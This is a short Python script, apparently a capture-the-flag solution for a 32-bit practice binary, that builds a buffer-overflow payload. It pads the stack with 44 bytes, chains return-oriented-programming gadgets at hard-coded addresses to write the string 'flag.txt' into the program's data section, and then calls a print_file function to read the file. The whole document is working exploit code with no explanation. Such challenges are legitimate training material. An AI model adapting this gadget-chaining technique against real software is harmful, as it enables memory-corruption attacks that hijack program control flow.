import struct
import sys

padding = b"A" * 44

_data = struct.pack("I", 0x0804a018)
_data_next = struct.pack("I", 0x0804a018+0x4)
mov_edi_ebp_ret = struct.pack("I", 0x08048543)
pop_edi_ebp_ret = struct.pack("I", 0x080485aa)
print_file = struct.pack("I", 0x080483d0)

exploit = print_file + b"AAAA" + _data

payload = padding + pop_edi_ebp_ret + _data + b"flag" + mov_edi_ebp_ret + pop_edi_ebp_ret + _data_next + b".txt" + mov_edi_ebp_ret + exploit

if sys.version_info[0] == 3:
      sys.stdout.buffer.write(payload)
else:
    print(payload)
